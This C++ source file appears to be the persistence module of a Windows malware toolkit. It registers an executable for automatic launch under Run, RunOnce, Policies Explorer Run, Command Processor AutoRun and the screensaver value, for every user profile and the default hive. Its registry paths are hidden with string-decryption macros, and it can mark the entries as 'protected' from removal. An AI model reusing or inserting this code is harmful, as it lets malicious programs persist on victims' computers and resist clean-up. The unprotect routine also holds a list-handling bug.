#include "sys_includes.h"
#include <sddl.h>
#include <shlwapi.h>

#include "arun.h"
#include "reg.h"
#include "syslib\files.h"
#include "syslib\mem.h"
#include "syslib\arun.h"
#include "syslib\debug.h"
#include "syslib\osenv.h"
#include "syslib\str.h"

#include "syslib\strcrypt.h"
#include "str_crx.h"

namespace SYSLIB
{
    static bool CheckArunInt(LPCWSTR lpFile,HKEY hKey,LPCWSTR lpValueName)
    {
        bool bRet=false;
        DWORD dwValSize;
        if (RegQueryValueExW(hKey,lpValueName,NULL,NULL,NULL,&dwValSize) == ERROR_SUCCESS)
        {
            WCHAR *lpValue=(WCHAR*)MemQuickAlloc(dwValSize);
            if (lpValue)
            {
                if (RegQueryValueExW(hKey,lpValueName,NULL,NULL,(byte*)lpValue,&dwValSize) == ERROR_SUCCESS)
                {
                    PathUnquoteSpacesW(lpValue);
                    if (!lstrcmpiW(lpValue,lpFile))
                        bRet=true;
                }
                MemFree(lpValue);
            }
        }
        return bRet;
    }

    static bool IsItArun(LPCWSTR lpFullKey,LPCWSTR lpFile,LPCWSTR lpValue,LPWSTR lpValueName)
    {
        bool bRet=false;
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_USERS,lpFullKey,0,KEY_READ|KEY_WOW64_64KEY,&hKey) == ERROR_SUCCESS)
        {
            if (lpValue)
            {
                if (CheckArunInt(lpFile,hKey,lpValue))
                {
                    if (lpValueName)
                        lstrcpyW(lpValueName,lpValue);
                    bRet=true;
                }
            }
            else
            {
                for (int i=0; ;i++)
                {
                    WCHAR szValueName[MAX_PATH];
                    DWORD dwValueNameSize=ARRAYSIZE(szValueName);
                    if (RegEnumValueW(hKey,i,szValueName,&dwValueNameSize,NULL,NULL,NULL,NULL) == ERROR_NO_MORE_ITEMS)
                        break;

                    if (CheckArunInt(lpFile,hKey,szValueName))
                    {
                        if (lpValueName)
                            lstrcpyW(lpValueName,szValueName);
                        bRet=true;
                        break;
                    }
                }
            }
            RegCloseKey(hKey);
        }
        return bRet;
    }

    static bool GetArunEntry(DWORD dwIdx,ARUN_REG_KEY *lpOut)
    {
        ARUN_REG_KEY lpKeys[]={{dcrW_c106200c("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),NULL},
                               {dcrW_f81b7ef3("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),NULL},
                               {dcrW_f7861a5b("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"),dcrW_5ab6c412("Run")},
                               /**{dcrW_a89bc1d1("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"),dcrW_5ab6c412("Run")},**/
                               {dcrW_68628c1c("Software\\Microsoft\\Command Processor"),dcrW_3b589920("AutoRun")},
                               {dcrW_d285e406("Control Panel\\Desktop"),dcrW_444b33fd("SCRNSAVE.EXE")}};

        bool bRet=false;
        if (dwIdx < ARRAYSIZE(lpKeys))
        {
            bRet=true;
            lpOut->lpKey=lpKeys[dwIdx].lpKey;
            lpOut->lpValue=lpKeys[dwIdx].lpValue;
        }
        return bRet;
    }

    bool ArunReg_CheckUserStartupW(LPCWSTR lpFile,PSID lpSid)
    {
        bool bRet=false;
        LPWSTR lpSidStr;
        if (ConvertSidToStringSidW(lpSid,&lpSidStr))
        {
            for (int i=0; ; i++)
            {
                ARUN_REG_KEY ArunKey;
                if (!GetArunEntry(i,&ArunKey))
                    break;

                WCHAR szFullPath[300];
                StrFormatW(szFullPath,dcrW_4f072b6d("%s\\%s"),lpSidStr,ArunKey.lpKey);

                bRet=IsItArun(szFullPath,lpFile,ArunKey.lpValue,NULL);
                if (bRet)
                    break;
            }
            LocalFree(lpSidStr);
        }
        return bRet;
    }

    bool ArunReg_CheckStartupW(LPCWSTR lpFile)
    {
        bool bRet=false;
        PSID lpSid;
        if (SysGetCurrentUserSID(&lpSid))
        {
            bRet=ArunReg_CheckUserStartupW(lpFile,lpSid);
            MemFree(lpSid);
        }
        return bRet;
    }

    static bool AppendFileInt(LPCWSTR lpFile,LPCWSTR lpRootKey,LPCWSTR lpValueName,DWORD dwValueSize)
    {
        bool bRet=false;
        HKEY hKey;
        if (RegCreateKeyExW(HKEY_USERS,lpRootKey,NULL,NULL,0,KEY_WRITE|KEY_WOW64_64KEY,NULL,&hKey,NULL) == ERROR_SUCCESS)
        {
            bRet=(RegSetValueExW(hKey,lpValueName,NULL,REG_SZ,(byte*)lpFile,dwValueSize) == ERROR_SUCCESS);
            RegFlushKey(hKey);
            RegCloseKey(hKey);
        }
        return bRet;
    }

    static bool AppendFileToArun(LPCWSTR lpFile,LPCWSTR lpRootKey)
    {
        WCHAR szFileName[MAX_PATH];
        CopyFileNameWithoutExtensionW(lpFile,szFileName);

        WCHAR szFullFileNameWithQuotes[MAX_PATH];
        DWORD dwFileNameSize=StrFormatW(szFullFileNameWithQuotes,dcrW_d8c58bc3("\"%s\""),lpFile),
              dwRets=0;
        dwFileNameSize*=sizeof(WCHAR);

        for (int i=0; ; i++)
        {
            ARUN_REG_KEY ArunKey;
            if (!GetArunEntry(i,&ArunKey))
                break;

            WCHAR szFullPath[300];
            StrFormatW(szFullPath,dcrW_4f072b6d("%s\\%s"),lpRootKey,ArunKey.lpKey);

            if (!IsItArun(szFullPath,szFullFileNameWithQuotes,ArunKey.lpValue,NULL))
            {
                LPCWSTR lpValue=szFileName;
                if (ArunKey.lpValue)
                    lpValue=ArunKey.lpValue;
                dwRets+=(AppendFileInt(szFullFileNameWithQuotes,szFullPath,lpValue,dwFileNameSize) != false);
            }
            else
                dwRets++;
        }
        return (dwRets != 0);
    }

    bool ArunReg_AppendFileToUserW(LPCWSTR lpFile,PSID lpSid)
    {
        bool bRet=false;
        LPWSTR lpSidStr;
        if (ConvertSidToStringSidW(lpSid,&lpSidStr))
        {
            bRet=AppendFileToArun(lpFile,lpSidStr);
            LocalFree(lpSidStr);
        }
        return bRet;
    }

    bool ArunReg_AppendFileW(LPCWSTR lpFile)
    {
        bool bRet=false;
        PSID lpSid;
        if (SysGetCurrentUserSID(&lpSid))
        {
            bRet=ArunReg_AppendFileToUserW(lpFile,lpSid);
            MemFree(lpSid);
        }
        return bRet;
    }

    static bool ArunReg_AppendFileToDefaultUserW(LPCWSTR lpFile)
    {
        return AppendFileToArun(lpFile,dcrW_6bbc7a2d(".DEFAULT"));
    }

    static DWORD WINAPI AppendArunCallback(PSID lpSID,ARUN_PARAM *lpParam)
    {
        lpParam->dwRet+=(ArunReg_AppendFileToUserW(lpParam->lpFile,lpSID) != false);
        return 0;
    }

    bool ArunReg_AppendFileToAllUsersW(LPCWSTR lpFile)
    {
        ARUN_PARAM apParam={0};
        apParam.lpFile=lpFile;
        EnumUserProfilesParam((ENUMUSERPROFILESCALLBACKPARAM*)AppendArunCallback,&apParam);
        apParam.dwRet+=(ArunReg_AppendFileToDefaultUserW(lpFile) != false);
        return (apParam.dwRet != 0);
    }

    static bool RemoveFromArun(LPCWSTR lpFile,LPCWSTR lpRoot)
    {
        DWORD dwRets=0;

        for (int i=0; ; i++)
        {
            ARUN_REG_KEY ArunKey;
            if (!GetArunEntry(i,&ArunKey))
                break;

            WCHAR szFullPath[300],szValue[MAX_PATH];
            StrFormatW(szFullPath,dcrW_4f072b6d("%s\\%s"),lpRoot,ArunKey.lpKey);

            if (IsItArun(szFullPath,lpFile,ArunKey.lpValue,szValue))
            {
                HKEY hKey;
                if (RegOpenKeyExW(HKEY_USERS,szFullPath,0,KEY_WRITE|KEY_WOW64_64KEY,&hKey) == ERROR_SUCCESS)
                {
                    dwRets+=(RegDeleteValueW(hKey,szValue) == ERROR_SUCCESS);
                    RegFlushKey(hKey);
                    RegCloseKey(hKey);
                }
            }
        }
        return (dwRets != 0);
    }

    static bool ArunReg_RemoveFromUserW(LPCWSTR lpFile,PSID lpSid)
    {
        bool bRet=false;
        LPWSTR lpSidStr;
        if (ConvertSidToStringSidW(lpSid,&lpSidStr))
        {
            bRet=RemoveFromArun(lpFile,lpSidStr);
            LocalFree(lpSidStr);
        }
        return bRet;
    }

    static bool ArunReg_RemoveFromDefaultUserW(LPCWSTR lpFile)
    {
        return RemoveFromArun(lpFile,dcrW_6bbc7a2d(".DEFAULT"));
    }

    static DWORD WINAPI RemoveArunCallback(PSID lpSID,ARUN_PARAM *lpParam)
    {
        lpParam->dwRet+=(ArunReg_RemoveFromUserW(lpParam->lpFile,lpSID) != false);
        return 0;
    }

    bool ArunReg_RemoveW(LPCWSTR lpFile)
    {
        ARUN_PARAM apParam={0};
        apParam.lpFile=lpFile;
        EnumUserProfilesParam((ENUMUSERPROFILESCALLBACKPARAM*)RemoveArunCallback,&apParam);
        apParam.dwRet+=(ArunReg_RemoveFromDefaultUserW(lpFile) != false);
        return (apParam.dwRet != 0);
    }

    static bool ArunReg_ProtectArunInt(LPCWSTR lpFile,LPCWSTR lpRoot,PROTECTED_ITEMS_HIVE *lpHive)
    {
        DWORD dwRets=0;

        for (int i=0; ; i++)
        {
            ARUN_REG_KEY ArunKey;
            if (!GetArunEntry(i,&ArunKey))
                break;

            WCHAR szFullPath[300],szValue[MAX_PATH];
            StrFormatW(szFullPath,dcrW_4f072b6d("%s\\%s"),lpRoot,ArunKey.lpKey);

            if (IsItArun(szFullPath,lpFile,ArunKey.lpValue,szValue))
                dwRets+=(SYSLIB::Arun_AddProtectedItem(lpHive,PROTECTED_REG,szFullPath,szValue) != false);
        }
        return (dwRets != 0);
    }

    static bool ArunReg_ProtectUserW(LPCWSTR lpFile,PSID lpSid,PROTECTED_ITEMS_HIVE *lpHive)
    {
        bool bRet=false;
        LPWSTR lpSidStr;
        if (ConvertSidToStringSidW(lpSid,&lpSidStr))
        {
            bRet=ArunReg_ProtectArunInt(lpFile,lpSidStr,lpHive);
            LocalFree(lpSidStr);
        }
        return bRet;
    }

    static DWORD WINAPI ProtectArunCallback(PSID lpSID,ARUN_PARAM *lpParam)
    {
        lpParam->dwRet+=(ArunReg_ProtectUserW(lpParam->lpFile,lpSID,lpParam->lpHive) != false);
        return 0;
    }

    static bool ArunReg_ProtectDefaultUserW(LPCWSTR lpFile,PROTECTED_ITEMS_HIVE *lpHive)
    {
        return ArunReg_ProtectArunInt(lpFile,dcrW_6bbc7a2d(".DEFAULT"),lpHive);
    }

    bool ArunReg_ProtectW(LPCWSTR lpFile,PROTECTED_ITEMS_HIVE *lpHive)
    {
        ARUN_PARAM apParam={0};
        apParam.lpFile=lpFile;
        apParam.lpHive=lpHive;
        EnumUserProfilesParam((ENUMUSERPROFILESCALLBACKPARAM*)ProtectArunCallback,&apParam);
        apParam.dwRet+=(ArunReg_ProtectDefaultUserW(lpFile,lpHive) != false);
        return (apParam.dwRet != 0);
    }

    void ArunReg_UnprotectW(LPCWSTR lpFile,PROTECTED_ITEMS_HIVE *lpHive)
    {
        if (lpHive->lpRegItems)
        {
            PROTECTED_ITEM *lpItem=lpHive->lpRegItems,*lpPrev=NULL;
            while (lpItem)
            {
                if (IsItArun(lpItem->szRootKey,lpFile,lpItem->szValueName,NULL))
                {
                    PROTECTED_ITEM *lpNext=lpItem->lpNext;

                    if (lpPrev)
                        lpPrev->lpNext=lpNext;
                    else
                        lpHive->lpLnkItems=lpNext;

                    MemFree(lpItem);
                    lpItem=lpNext;
                    continue;
                }

                lpPrev=lpItem;
                lpItem=lpItem->lpNext;
            }
        }
        return;
    }
}

